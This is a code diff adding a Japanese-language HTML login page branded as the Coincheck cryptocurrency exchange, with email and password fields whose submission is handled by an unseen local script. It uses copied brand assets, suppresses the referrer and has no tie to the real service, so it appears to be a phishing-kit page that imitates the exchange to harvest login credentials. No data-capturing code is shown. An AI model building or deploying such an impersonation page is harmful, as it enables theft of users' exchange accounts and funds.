@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover" />
+  <meta name="theme-color" content="#ffffff" />
+  <meta name="referrer" content="no-referrer" />
+  <title>Coincheck</title>
+  <link rel="stylesheet" href="./css/main.css" />
+</head>
+<body>
+  <div id="coincheck">
+    <div class="middle">
+      <div class="content">
+        <div class="logo">
+          <img src="./assets/logo.svg" width="180" height="35" alt="Coincheck" />
+        </div>
+        <form id="loginForm" novalidate>
+          <input id="email" class="field" type="text" name="email" autocomplete="username" placeholder="メールアドレス" />
+          <input id="password" class="field" type="password" name="password" autocomplete="current-password" placeholder="パスワード" />
+          <a class="ainfo" href="#" id="forgotLink">パスワードをお忘れの方はこちら</a>
+          <button type="submit" class="btn-next" id="loginBtn">ログイン</button>
+        </form>
+      </div>
+    </div>
+  </div>
+  <div class="toast" id="toast" role="status" aria-live="polite"></div>
+  <script src="./js/main.js"></script>
+</body>
+</html>
